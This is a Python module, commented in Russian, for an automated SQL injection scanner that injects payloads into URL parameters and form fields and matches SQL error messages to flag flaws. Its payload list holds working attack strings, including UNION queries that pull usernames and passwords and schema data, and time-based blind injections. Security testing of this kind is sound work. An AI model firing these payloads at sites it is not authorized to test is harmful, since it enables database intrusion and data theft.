import logging
from ..http_client import HttpClient
from typing import List, Dict, Optional
import re
from urllib.parse import urlparse, parse_qs, urlencode

logger = logging.getLogger(__name__)

class SQLInjectionScanner:
    def __init__(self, client=None):
        # Инициализация HTTP клиента
        self.client = client if client else HttpClient()
        
        # Список полезных нагрузок для тестирования SQL-инъекций
        self.payloads = [
            # Базовые полезные нагрузки для определения уязвимости
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            
            # Полезные нагрузки для определения типа базы данных
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            
            # Полезные нагрузки для извлечения данных
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT table_name,column_name FROM information_schema.columns--",
            "' UNION SELECT @@version,NULL--",
            
            # Полезные нагрузки для слепых SQL-инъекций
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(10000000,MD5('a'))--",
            
            # Полезные нагрузки для определения типа СУБД
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND 1=CONVERT(int,(SELECT user()))--"
        ]
        
        # Паттерны для определения ошибок SQL
        self.error_patterns = {
            # Ошибки MySQL
            'mysql': [
                r'SQL syntax.*MySQL',
                r'Warning.*mysql_.*',
                r'valid MySQL result',
                r'MySqlClient\.',
                r'com\.mysql\.jdbc\.exceptions'
            ],
            
            # Ошибки PostgreSQL
            'postgresql': [
                r'PostgreSQL.*ERROR',
                r'Warning.*\Wpg_.*',
                r'valid PostgreSQL result',
                r'Npgsql\.',
                r'org\.postgresql\.util\.PSQLException'
            ],
            
            # Ошибки Microsoft SQL Server
            'mssql': [
                r'Driver.* SQL[\-\_\ ]*Server',
                r'OLE DB.* SQL Server',
                r'(\W|\A)SQL Server.*Driver',
                r'Warning.*mssql_.*',
                r'(\W|\A)SQL Server.*[0-9a-fA-F]{8}',
                r'System\.Data\.SqlClient\.SqlException',
                r'(?s)Exception.*\WSystem\.Data\.SqlClient\.',
                r'(?s)Exception.*\WRoadhouse\.Cms\.'
            ],
            
            # Ошибки Oracle
            'oracle': [
                r'\bORA-[0-9][0-9][0-9][0-9]',
                r'Oracle error',
                r'Oracle.*Driver',
                r'Warning.*\Woci_.*',
                r'Warning.*\Wora_.*'
            ],
            
            # Ошибки SQLite
            'sqlite': [
                r'SQLite/JDBCDriver',
                r'SQLite.Exception',
                r'System.Data.SQLite.SQLiteException',
                r'Warning.*sqlite_.*',
                r'Warning.*SQLite3::',
                r'\[SQLITE_ERROR\]'
            ]
        }
        
        # Паттерны для определения успешных SQL-инъекций
        self.success_patterns = [
            r'You have an error in your SQL syntax',
            r'Warning: mysql_',
            r'Warning: pg_',
            r'Warning: oci_',
            r'Warning: sqlite_',
            r'SQL syntax.*MySQL',
            r'valid MySQL result',
            r'MySqlClient\.',
            r'PostgreSQL.*ERROR',
            r'valid PostgreSQL result',
            r'Npgsql\.',
            r'Driver.* SQL[\-\_\ ]*Server',
            r'OLE DB.* SQL Server',
            r'(\W|\A)SQL Server.*Driver',
            r'Warning.*mssql_.*',
            r'(\W|\A)SQL Server.*[0-9a-fA-F]{8}',
            r'System\.Data\.SqlClient\.SqlException',
            r'\bORA-[0-9][0-9][0-9][0-9]',
            r'Oracle error',
            r'Oracle.*Driver',
            r'Warning.*\Woci_.*',
            r'Warning.*\Wora_.*',
            r'SQLite/JDBCDriver',
            r'SQLite.Exception',
            r'System.Data.SQLite.SQLiteException',
            r'Warning.*sqlite_.*',
            r'Warning.*SQLite3::',
            r'\[SQLITE_ERROR\]'
        ]

    def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
        # Основной метод сканирования, который проверяет SQL-инъекции
        vulnerabilities = []
        
        try:
            # Проверка параметров URL
            url_vulns = self._check_url_params(url)
            vulnerabilities.extend(url_vulns)
            
            # Проверка форм
            if forms:
                form_vulns = self._check_forms(url, forms)
                vulnerabilities.extend(form_vulns)
            
        except Exception as e:
            logger.error(f"SQL Injection scan error: {str(e)}")
        
        return vulnerabilities

    def _check_url_params(self, url: str) -> List[Dict]:
        # Проверка параметров URL на SQL-инъекции
        vulnerabilities = []
        try:
            # Парсинг URL для получения параметров
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            # Проверка каждого параметра
            for param, values in params.items():
                for value in values:
                    for payload in self.payloads:
                        try:
                            # Создание URL с внедренной полезной нагрузкой
                            modified_params = params.copy()
                            modified_params[param] = [payload]
                            modified_query = urlencode(modified_params, doseq=True)
                            modified_url = parsed_url._replace(query=modified_query).geturl()
                            
                            # Отправка запроса
                            response = self.client.get(modified_url, timeout=10)
                            if not response:
                                continue
                            
                            # Проверка на уязвимость
                            if self._is_vulnerable(response.text, payload):
                                db_type = self._detect_db_type(response.text)
                                vulnerabilities.append({
                                    'type': 'SQL Injection',
                                    'url': modified_url,
                                    'payload': payload,
                                    'evidence': self._get_evidence(response.text, payload, db_type),
                                    'severity': 'high',
                                    'param': param,
                                    'method': 'GET',
                                    'db_type': db_type
                                })
                                break
                        
                        except Exception as e:
                            logger.error(f"URL parameter check error for {param}: {str(e)}")
        
        except Exception as e:
            logger.error(f"URL parameters check error: {str(e)}")
        
        return vulnerabilities

    def _check_forms(self, url: str, forms: List[Dict]) -> List[Dict]:
        # Проверка форм на SQL-инъекции
        vulnerabilities = []
        try:
            for form in forms:
                # Получение метода и действия формы
                method = form.get('method', 'GET').upper()
                action = form.get('action', url)
                
                # Проверка каждого поля формы
                for field in form.get('fields', []):
                    field_name = field.get('name')
                    field_type = field.get('type', 'text')
                    
                    # Пропуск полей, не подходящих для SQL-инъекций
                    if field_type not in ['text', 'textarea', 'hidden', 'search', 'email', 'url']:
                        continue
                    
                    for payload in self.payloads:
                        try:
                            # Подготовка данных формы
                            form_data = {}
                            for f in form.get('fields', []):
                                if f.get('name') == field_name:
                                    form_data[f.get('name')] = payload
                                else:
                                    form_data[f.get('name')] = f.get('value', '')
                            
                            # Отправка запроса
                            if method == 'GET':
                                response = self.client.get(action, params=form_data, timeout=10)
                            else:
                                response = self.client.post(action, data=form_data, timeout=10)
                            
                            if not response:
                                continue
                            
                            # Проверка на уязвимость
                            if self._is_vulnerable(response.text, payload):
                                db_type = self._detect_db_type(response.text)
                                vulnerabilities.append({
                                    'type': 'SQL Injection',
                                    'url': action,
                                    'payload': payload,
                                    'evidence': self._get_evidence(response.text, payload, db_type),
                                    'severity': 'high',
                                    'param': field_name,
                                    'method': method,
                                    'db_type': db_type
                                })
                                break
                        
                        except Exception as e:
                            logger.error(f"Form field check error for {field_name}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Forms check error: {str(e)}")
        
        return vulnerabilities

    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        # Проверка, является ли ответ уязвимым к SQL-инъекциям
        try:
            # Проверка наличия ошибок SQL
            for pattern in self.success_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
            
            # Проверка разницы в ответах
            if payload in response_text:
                return True
            
            return False
        
        except Exception as e:
            logger.error(f"Vulnerability check error: {str(e)}")
            return False

    def _detect_db_type(self, response_text: str) -> str:
        # Определение типа базы данных по ошибкам
        try:
            for db_type, patterns in self.error_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return db_type
            return 'unknown'
        
        except Exception as e:
            logger.error(f"Database type detection error: {str(e)}")
            return 'unknown'

    def _get_evidence(self, response_text: str, payload: str, db_type: str) -> str:
        # Получение доказательства уязвимости
        try:
            # Поиск ошибок SQL
            for pattern in self.success_patterns:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return f"SQL error found: {match.group(0)}"
            
            # Поиск отражения полезной нагрузки
            if payload in response_text:
                return f"Payload '{payload}' was reflected in the response"
            
            return f"SQL Injection vulnerability detected (DB type: {db_type})"
        
        except Exception as e:
            logger.error(f"Evidence collection error: {str(e)}")
            return "Error collecting evidence" 